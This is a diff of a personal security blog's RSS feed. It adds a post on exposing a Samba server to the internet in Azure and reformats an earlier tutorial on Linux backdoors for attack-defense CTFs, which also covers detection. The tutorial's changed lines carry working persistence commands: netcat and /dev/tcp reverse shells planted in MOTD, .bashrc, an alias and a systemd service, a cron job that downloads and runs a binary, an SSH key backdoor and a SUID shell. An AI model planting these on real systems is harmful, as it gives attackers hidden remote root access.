@@ -5,13 +5,178 @@
     <link>https://fahmifj.github.io/tags/security/</link>
     <description>Recent content in Security on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Tue, 25 May 2021 18:49:35 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 04 Jul 2021 19:45:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Exposing an SMB Server to the Internet in Azure</title>
+      <link>https://fahmifj.github.io/blog/exposing-smb-server-to-internet-in-azure/</link>
+      <pubDate>Sun, 04 Jul 2021 19:45:21 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/exposing-smb-server-to-internet-in-azure/</guid>
+      <description>And wait for bad things to happen</description>
+      <content:encoded><![CDATA[<p>Last month, I was asked to setup a Samba/SMB server to be accessible over the Internet. The server will only be used temporarily, which then I decided to deploy an Azure Virtual Machine (VM) using my student subscription instead of buying a new dedicated VPS.</p>
+<p>In the end, the server is not being used, so I will just dump my documentation about it here.</p>
+<p>Before proceeding further, I will state that:</p>
+<p>Exposing the SMB Server directly to the Internet is not considered a &ldquo;best practice&rdquo;. The safest way to make it accessible over the Internet is to set up a VPN server and place the server inside the VPN network.</p>
+<h4 id="goals">Goals</h4>
+<p>By the end of this post, you should be able to:</p>
+<ul>
+<li>Deploy an Ubuntu server in Azure</li>
+<li>Setup and Configure a Samba server</li>
+<li>Exposing Samba server over Internet</li>
+</ul>
+<h4 id="prerequisites">Prerequisites</h4>
+<ul>
+<li>Azure Account</li>
+<li>Basic knowledge of Azure, at least menu navigation and creating a resource group.</li>
+<li>Basic knowledge of Linux</li>
+</ul>
+<h2 id="vm-configuration--deployment">VM Configuration &amp; Deployment</h2>
+<h3 id="create-vm">Create VM</h3>
+<p>At this step, I already have a resource group called <code>IAMF_SMB-TEST</code> and I&rsquo;ll be creating a VM instance inside this resource. It&rsquo;s a small server used by 4-5 users, so B1s will be enough. You&rsquo;re free to customize the VM.</p>
+<p>The VM details of mine can be seen in the following image:</p>
+<img src="imgs/image-20210513170545346.png" alt="image-20210513170545346" style="zoom: 50%;" />
+<p>For authentication to the server, I&rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called <code>azure-smb</code>. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).</p>
+<img src="imgs/image-20210513170638603.png" alt="image-20210513170638603" style="zoom:50%;" />
+<p>In the following section, I&rsquo;ll use a standard SSD and leave the other settings at their defaults.</p>
+<img src="imgs/image-20210513170710958.png" alt="image-20210513170710958" style="zoom:50%;" />
+<p>In the <strong>Networking</strong> section, I&rsquo;ll just create a new virtual network. See the following image for details:</p>
+<img src="imgs/image-20210513170824172.png" alt="image-20210513170824172" style="zoom:50%;" />
+<p>In the <strong>Management</strong> section, I&rsquo;ll just disable the boot diagnostics.</p>
+<img src="imgs/image-20210513171009570.png" alt="image-20210513171009570" style="zoom:50%;" />
+<p>I&rsquo;ll leave the <strong>Advanced</strong> with the default settings and skip the <strong>Tags</strong> section.</p>
+<p>The last section is <strong>Review + Create</strong>, which basically a section to review the VM configuration. After I finish the review, I&rsquo;ll press the <strong>Create</strong> button.</p>
+<img src="imgs/image-20210513171153896.png" alt="image-20210513171153896" style="zoom:50%;" />
+<p>When the <strong>Create</strong> button is clicked, the VM will be deployed automatically.</p>
+<img src="imgs/image-20210513171501031.png" alt="image-20210513171501031" style="zoom:50%;" />
+<h3 id="access-vm">Access VM</h3>
+<p>Once the machine or VM has been deployed. Log into it using SSH. The public IP of the VM instance can be found at the <code>Dashboard</code> &gt; <code>RESOURCE_GROUP_NAME</code> &gt; <code>PUBLIC_IP_NAME</code>. In my case, it is <code>Dashboard</code> &gt; <code>IAMF_SMB-TEST</code> &gt; <code>smb-server-ip</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS</span></span></code></pre>
+</figure><img src="imgs/image-20210513171606268.png" alt="image-20210513171606268" style="zoom:50%;" />
+<h2 id="samba">Samba</h2>
+<h3 id="repo-update">Repo Update</h3>
+<p>First thing first, let&rsquo;s update the repository list.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo apt update</span></span></code></pre>
+</figure><h3 id="install-samba">Install Samba</h3>
+<p>After that, install <code>Samba</code> with the following command.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo apt install samba</span></span></code></pre>
+</figure><p>Once the installation is done, check the Samba service daemon status.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo systemctl status smbd
+</span></span><span class="line"><span class="cl">● smbd.service - Samba SMB Daemon
+</span></span><span class="line"><span class="cl">   Loaded: loaded <span class="o">(</span>/lib/systemd/system/smbd.service<span class="p">;</span> enabled<span class="p">;</span> vendor preset: enabled<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   Active: active <span class="o">(</span>running<span class="o">)</span> since Thu 2021-05-13 10:17:45 UTC<span class="p">;</span> 3min 48s ago
+</span></span><span class="line"><span class="cl">     Docs: man:smbd<span class="o">(</span>8<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           man:samba<span class="o">(</span>7<span class="o">)</span>
+</span></span><span class="line"><span class="cl">           man:smb.conf<span class="o">(</span>5<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> Main PID: <span class="m">2098</span> <span class="o">(</span>smbd<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   Status: <span class="s2">&#34;smbd: ready to serve connections...&#34;</span>
+</span></span><span class="line"><span class="cl">    Tasks: <span class="m">4</span> <span class="o">(</span>limit: 1056<span class="o">)</span>
+</span></span><span class="line"><span class="cl">   CGroup: /system.slice/smbd.service
+</span></span><span class="line"><span class="cl">           ├─2098 /usr/sbin/smbd --foreground --no-process-group
+</span></span><span class="line"><span class="cl">           ├─2123 /usr/sbin/smbd --foreground --no-process-group
+</span></span><span class="line"><span class="cl">           ├─2124 /usr/sbin/smbd --foreground --no-process-group
+</span></span><span class="line"><span class="cl">           └─2129 /usr/sbin/smbd --foreground --no-process-group
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">May <span class="m">13</span> 10:17:44 smb-server systemd<span class="o">[</span>1<span class="o">]</span>: Starting Samba SMB Daemon...
+</span></span><span class="line"><span class="cl">May <span class="m">13</span> 10:17:45 smb-server systemd<span class="o">[</span>1<span class="o">]</span>: Started Samba SMB Daemon.</span></span></code></pre>
+</figure><p>Samba is ready, and now let&rsquo;s configure the share folder.</p>
+<h3 id="configure-shares">Configure Shares</h3>
+<p>First, let&rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf<span class="o">{</span>,.backup<span class="o">}</span></span></span></code></pre>
+</figure><p>Now create a share folder name it <code>sambashare</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ mkdir sambashare</span></span></code></pre>
+</figure><p>Then open the samba configuration file with a text editor like <code>nano</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf</span></span></code></pre>
+</figure><p>Go straight to the bottom of the file and add the following lines.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>sambashare<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">comment</span> <span class="o">=</span> Samba Share
+</span></span><span class="line"><span class="cl">    <span class="nv">path</span> <span class="o">=</span> /home/azure-smb/sambashare
+</span></span><span class="line"><span class="cl">    <span class="nb">read</span> <span class="nv">only</span> <span class="o">=</span> no
+</span></span><span class="line"><span class="cl">    <span class="nv">browsable</span> <span class="o">=</span> yes</span></span></code></pre>
+</figure><blockquote>
+<p>Note: Details for configuring a share can be read <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html"target="_blank" rel="noopener noreferrer"
+>here</a> or <a href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/s1-samba-configuring.html"target="_blank" rel="noopener noreferrer"
+>here</a>.</p>
+</blockquote>
+<p>Save the file and restart the SMB daemon with the following command:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo service smbd restart</span></span></code></pre>
+</figure><p>Lastly, update the firewall to allow network traffic for Samba/SMB.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo ufw allow samba</span></span></code></pre>
+</figure><p>This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:</p>
+<ul>
+<li><a href="https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/"target="_blank" rel="noopener noreferrer"
+>https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/</a></li>
+<li><a href="https://confluence.jaytaala.com/display/TKB/Create&#43;samba&#43;share&#43;writeable&#43;by&#43;all%2C&#43;group%2C&#43;or&#43;only&#43;a&#43;user"target="_blank" rel="noopener noreferrer"
+>https://confluence.jaytaala.com/display/TKB/Create&#43;samba&#43;share&#43;writeable&#43;by&#43;all%2C&#43;group%2C&#43;or&#43;only&#43;a&#43;user</a></li>
+<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04"target="_blank" rel="noopener noreferrer"
+>https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04</a></li>
+</ul>
+<h3 id="add-samba-user">Add Samba User</h3>
+<p>Currently, our Linux account for administering the server is <code>azure-smb</code> and we shouldn&rsquo;t use this account password to access the SMB shares. So, let&rsquo;s just create a dedicated user for SMB called <code>user1</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1</span></span></code></pre>
+</figure><p>Assign <code>user1</code> to be the owner of the share</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare</span></span></code></pre>
+</figure><p>After that, create a Samba password for <code>user1</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo smbpasswd -a user1
+</span></span><span class="line"><span class="cl">New SMB password: 
+</span></span><span class="line"><span class="cl">Retype new SMB password: 
+</span></span><span class="line"><span class="cl">Added user user1.</span></span></code></pre>
+</figure><p>Finally, enable the user.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">azure-smb@smb-server:~$ sudo smbpasswd -e user1
+</span></span><span class="line"><span class="cl">Enabled user user1.</span></span></code></pre>
+</figure><h2 id="expose-smb-to-the-internet">Expose SMB to the Internet</h2>
+<h3 id="allow-inbound-connection">Allow Inbound Connection</h3>
+<p>Now if we want to make the SMB server available on the Internet, we have to go back to the Azure Portal to open the SMB port (port 445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">PUBLIC_IP:445 --&gt; PRIVATE_IP:445</span></span></code></pre>
+</figure><p>To do that open up the Networking settings of the SMB VM and click on <strong>Add inbound port rule</strong> button.</p>
+<img src="imgs/image-20210513173838694.png" alt="image-20210513173838694" style="zoom:50%;" />
+<p>On the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:</p>
+<img src="imgs/image-20210513173858659.png" alt="image-20210513173858659" style="zoom:50%;" />
+<p>At the bottom, the configuration is as follows:</p>
+<img src="imgs/image-20210513173929271.png" alt="image-20210513173929271" style="zoom:50%;" />
+<p>When you&rsquo;re done, click on the <strong>Add</strong> button and the new rule should listed in the <strong>Inbound port rules</strong> section.</p>
+<img src="imgs/image-20210513174018895.png" alt="image-20210513174018895" style="zoom:50%;" />
+<h3 id="verify-public-access">Verify Public Access</h3>
+<p>We can use <code>nmap</code> to see if the SMB port has been opened.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ nmap -p445 -sV VM_PUBLIC_IP</span></span></code></pre>
+</figure><img src="imgs/image-20210513174227862.png" alt="image-20210513174227862" style="zoom:50%;" />
+<p>To interact with the SMB server via CLI, you can use <code>smbclient</code>. Install it with:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ sudo apt install smbclient</span></span></code></pre>
+</figure><p>Once it installed, connect to the share with following command:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> </span></span></code></pre>
+</figure><p>Adding <code>-N -L</code> can list all the available shares.</p>
+<img src="imgs/image-20210513174416250.png" alt="image-20210513174416250" style="zoom:50%;" />
+<p>You can also provide the password directly in the terminal:</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> -U <span class="o">[</span>username<span class="o">]</span> <span class="o">[</span>password<span class="o">]</span>
+</span></span><span class="line"><span class="cl">$ smbclient //<span class="o">[</span>IP<span class="o">]</span>/<span class="o">[</span>sharename<span class="o">]</span> -U <span class="s1">&#39;username%password&#39;</span></span></span></code></pre>
+</figure><p>And that&rsquo;s all. It is not that detailed, but I hope you will find it useful.</p>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>Linux Backdoors and Where to Find Them</title>
-      <link>https://fahmifj.github.io/articles/linux-backdoors-and-where-to-find-them/</link>
+      <link>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</link>
       <pubDate>Tue, 25 May 2021 18:49:35 +0700</pubDate>
       
-      <guid>https://fahmifj.github.io/articles/linux-backdoors-and-where-to-find-them/</guid>
+      <guid>https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/</guid>
       <description>Learning about backdoor techniques and how to deal with them</description>
       <content:encoded><![CDATA[<p>In Attack-Defense CTF, leaving backdoors is an important part of maintaining access to the target system. As a result, learning some of the backdoor techniques is essential, not only for attackers but also for defenders.</p>
 <h2 id="backdoor-what-is-it">Backdoor, what is it?</h2>
@@ -31,11 +196,13 @@
 <p>As an attacker, you don&rsquo;t want to repeat all these exploitation steps all over again to gain root access.</p>
 <p>Instead, on the attacking machine, we can generate a new pair of <a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54"target="_blank" rel="noopener noreferrer"
 >SSH keys</a> for backdoor purpose with the following command:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh-keygen -a <span class="m">50</span> -t ed25519 -f backdoor_ssh -q -N <span class="s2">&#34;&#34;</span>
-</span></span></code></pre></div><p>It will produce 2 files: one is a private key (<code>backdoor_ssh</code>) and the other is a public key (<code>backdoor_ssh.pub</code>).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ssh-keygen -a <span class="m">50</span> -t ed25519 -f backdoor_ssh -q -N <span class="s2">&#34;&#34;</span></span></span></code></pre>
+</figure><p>It will produce 2 files: one is a private key (<code>backdoor_ssh</code>) and the other is a public key (<code>backdoor_ssh.pub</code>).</p>
 <p>By inserting the public key (<code>backdoor_ssh.pub</code>) into the <code>authorized_keys</code> file of the root of our victim server, we have authorized ourselves to gain root access via SSH.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:~# mkdir -p /root/.ssh/ <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZ.... root@kali&#39;</span> &gt; /root/.ssh/authorized_keys
-</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:~# mkdir -p /root/.ssh/ <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZ.... root@kali&#39;</span> &gt; /root/.ssh/authorized_keys</span></span></code></pre>
+</figure><p><div class="img-container"><img src="imgs/image-20210526005156382.png" alt="image-20210526005156382"  /></div>
 </p>
 <h3 id="2-ssh-backdoor--motd">2. SSH Backdoor:  MOTD</h3>
 <p><strong>Motd</strong> (Message of the day) is the banner that appears when you log in to a server using SSH. It displays messages about system informations to users. The message can be customized, which you can find, on most Debian-based distro, under <code>/etc/update-motd.d/</code>. By default, regular users don&rsquo;t have write permission on that directory.</p>
@@ -48,8 +215,9 @@
 </p>
 <p>As an attacker with root access, I could place a new script, such as a <a href="https://www.techslang.com/definition/what-is-a-reverse-shell/"target="_blank" rel="noopener noreferrer"
 >reverse shell</a>, in the <code>/etc/update-motd.d</code> directory as a backdoor. Then, I could simply set up a netcat listener to maintain access later.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/update-motd.d# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39;</span> &gt; 20-backdoor <span class="o">&amp;&amp;</span> chmod +x 20-backdoor
-</span></span></code></pre></div><p>If someone logs in to the server via SSH, the backdoor script would be executed and would connect back to my netcat listener, giving me root shell access.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/update-motd.d# <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nnc 192.168.2.103 9001 -e /bin/bash &amp;&#39;</span> &gt; 20-backdoor <span class="o">&amp;&amp;</span> chmod +x 20-backdoor</span></span></code></pre>
+</figure><p>If someone logs in to the server via SSH, the backdoor script would be executed and would connect back to my netcat listener, giving me root shell access.</p>
 <p><div class="img-container"><img src="imgs/image-20210526010934360.png" alt="image-20210526010934360"  /></div>
 </p>
 <p>In the image above, I simulated an SSH login using low privilege account, but did you notice that I ended up with root access?</p>
@@ -66,13 +234,15 @@
 <p><div class="img-container"><img src="imgs/image-20210526005325944.png" alt="image-20210526005325944"  /></div>
 </p>
 <p>In the image above, I have inserted a non malicious line script <code>echo &quot;I'm triggered&quot;</code> to my <code>.bashrc</code>. But, as an attacker, we could put something like reverse shell into the file and set up another netcat listener to maintain access.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pinky@pinkys-palace:~$ <span class="nb">echo</span> <span class="s1">&#39;nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;&#39;</span> &gt; .bashrc	
-</span></span></code></pre></div><p>And then, whenever the user logs in or opens a new terminal session, the backdoor would be executed and connect back to my listener.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">pinky@pinkys-palace:~$ <span class="nb">echo</span> <span class="s1">&#39;nc 192.168.2.103 9001 -e /bin/bash &gt;/dev/null &amp;&#39;</span> &gt; .bashrc	</span></span></code></pre>
+</figure><p>And then, whenever the user logs in or opens a new terminal session, the backdoor would be executed and connect back to my listener.</p>
 <p><div class="img-container"><img src="imgs/image-20210525220025256.png" alt="image-20210525220025256"  /></div>
 </p>
 <p>It&rsquo;s also possible to insert malicious code wrapped in an alias within the <code>bashrc</code> file. For example:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">cd</span><span class="o">=</span><span class="s1">&#39;$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd&#39;</span>
-</span></span></code></pre></div><p>When a user invokes <code>cd</code>, it actually executes the reverse shell command embedded in the alias first.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">alias</span> <span class="nv">cd</span><span class="o">=</span><span class="s1">&#39;$(nc 192.168.2.103 9001 -e /bin/bash&amp;); cd&#39;</span></span></span></code></pre>
+</figure><p>When a user invokes <code>cd</code>, it actually executes the reverse shell command embedded in the alias first.</p>
 <p><div class="img-container"><img src="imgs/image-20210526002305189.png" alt="image-20210526002305189"  /></div>
 </p>
 <p>Here are some examples of alias backdoors:</p>
@@ -84,32 +254,37 @@
 </ul>
 <h3 id="4-cron-job">4. Cron job</h3>
 <p>Cron is a feature from Linux/UNIX-like OS that can be used to periodically perform a specific job or task just like Task Scheduler feature in Windows. This feature also becomes an effective vector for maintaining long-term access to a compromised system. For example:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:~# <span class="nb">echo</span> <span class="s1">&#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor&#39;</span> &gt; /etc/cron.d/backdoor
-</span></span></code></pre></div><p>What the task above does is it will download a malicious binary called &lsquo;backdoor&rsquo; from my attacking machine, and the backdoor is then executed once every minute.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:~# <span class="nb">echo</span> <span class="s1">&#39;* * * * * root cd /tmp; wget 192.168.2.103/backdoor &amp;&amp; chmod +x backdoor &amp;&amp; ./backdoor&#39;</span> &gt; /etc/cron.d/backdoor</span></span></code></pre>
+</figure><p>What the task above does is it will download a malicious binary called &lsquo;backdoor&rsquo; from my attacking machine, and the backdoor is then executed once every minute.</p>
 <p><div class="img-container"><img src="imgs/image-20210625141344607.png" alt="image-20210625141344607"  /></div>
 </p>
 <p>For stealthy reasons, attackers may even embed the backdoor within the legitimate scheduled tasks.</p>
 <h3 id="5-backdoor-as-a-service">5. Backdoor as a Service</h3>
 <p>An attacker can also create a backdoor as a service (BaaS). For example:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># backdoor.service
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># backdoor.service
 </span></span><span class="line"><span class="cl">[Service]
 </span></span><span class="line"><span class="cl">Type=simple
 </span></span><span class="line"><span class="cl">User=root
 </span></span><span class="line"><span class="cl">ExecStart=/bin/bash -c &#34;bash -i &gt;&amp; /dev/tcp/192.168.2.103/9001 0&gt;&amp;1&#34;
 </span></span><span class="line"><span class="cl">[Install]
-</span></span><span class="line"><span class="cl">WantedBy=multi-user.target&#39;
-</span></span></code></pre></div><p>When the service starts, it establishes a reverse shell connection to the attacker’s system which then allows the attacker to remotely control the compromised machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service
-</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
+</span></span><span class="line"><span class="cl">WantedBy=multi-user.target&#39;</span></span></code></pre>
+</figure><p>When the service starts, it establishes a reverse shell connection to the attacker’s system which then allows the attacker to remotely control the compromised machine.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/systemd/system# systemctl start backdoor.service</span></span></code></pre>
+</figure><p><div class="img-container"><img src="imgs/image-20210526013637397.png" alt="image-20210526013637397"  /></div>
 </p>
 <p>It can be enabled on boot to ensure that the reverse shell connects back to the attacker’s system automatically each time the compromised machine starts.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/systemd/system# systemctl <span class="nb">enable</span> backdoor.service
-</span></span></code></pre></div><h3 id="6-suid">6. SUID</h3>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/etc/systemd/system# systemctl <span class="nb">enable</span> backdoor.service</span></span></code></pre>
+</figure><h3 id="6-suid">6. SUID</h3>
 <p>The last one on this post is <a href="https://en.wikipedia.org/wiki/Setuid"target="_blank" rel="noopener noreferrer"
 >SUID</a>. SUID allows another user to run an executable binary as the owner of that binary.</p>
 <p>For example, I can make a copy of the bash binary (owned by root) called <code>.backdoor</code> (notably starting with a dot to conceal it) and set the SUID permission on it for a low privilege user who has been compromised.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/bin# cp bash/home/pinky/.backdoor <span class="o">&amp;&amp;</span> chmod <span class="m">4755</span> /home/pinky/.backdoor
-</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@pinkys-palace:/bin# cp bash/home/pinky/.backdoor <span class="o">&amp;&amp;</span> chmod <span class="m">4755</span> /home/pinky/.backdoor</span></span></code></pre>
+</figure><p><div class="img-container"><img src="imgs/image-20210526020936681.png" alt="image-20210526020936681"  /></div>
 </p>
 <h2 id="defenders-side">Defenders Side</h2>
 <p>Before proceeding, I want to emphasize that if your server is compromised in real life, it&rsquo;s generally better to restore it from a backup or rebuild it from scratch. This recommendation is based on the fact that backdoors can be obfuscated and may be combined with other techniques, not to mention the possibility of a rootkit being present, making them difficult to detect and remove.</p>
@@ -127,8 +302,9 @@
 <h3 id="ssh-motd">SSH Motd</h3>
 <p>It&rsquo;s not always placed under <code>/etc/update-motd.d/</code>, but make sure the <strong>motd</strong> directory is only writable by root, note the default list of <strong>motd</strong> files and apply the same thing as above (skeleton file) because the attackers might have inserted a backdoor in the original files.</p>
 <p>We could also do some &lsquo;forensics&rsquo; using timestamp:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@MSI:/etc/update-motd.d# ls --full-time
-</span></span></code></pre></div><p>For example, these files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state since OS installation.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@MSI:/etc/update-motd.d# ls --full-time</span></span></code></pre>
+</figure><p>For example, these files with the timestamp <code>000000000</code> (nano) in the image below have most likely not been modified and are still in their original state since OS installation.</p>
 <p><div class="img-container"><img src="imgs/image-20210605092751344.png" alt="image-20210605092751344"  /></div>
 </p>
 <p>After inserting a non-malicious line, the timestamp changed. From here, it&rsquo;s safe to assume that someone/something has modified it.</p>
@@ -138,41 +314,50 @@
 <p>For this one, monitoring is the key.  We can monitor the network sockets and processes using the <code>netstat</code> or the  <code>ss</code> command and the <code>ps</code> command. Be suspicious to any program if it has an IP and port supplied as its arguments. Also make sure these commands aren&rsquo;t aliased by the attackers (like <a href="https://github.com/iamckn/backdoors/blob/master/bd_hide.sh"target="_blank" rel="noopener noreferrer"
 >this</a> one).</p>
 <p>For this, we can look for any unwanted open ports using this command:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep LISTEN
-</span></span></code></pre></div><p>To find a suspicious network connection we can use this command:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep ESTABLISHED
-</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210526034616621.png" alt="image-20210526034616621"  /></div>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ netstat -antp <span class="p">|</span> grep LISTEN</span></span></code></pre>
+</figure><p>To find a suspicious network connection we can use this command:</p>
+<figure class="highlight">
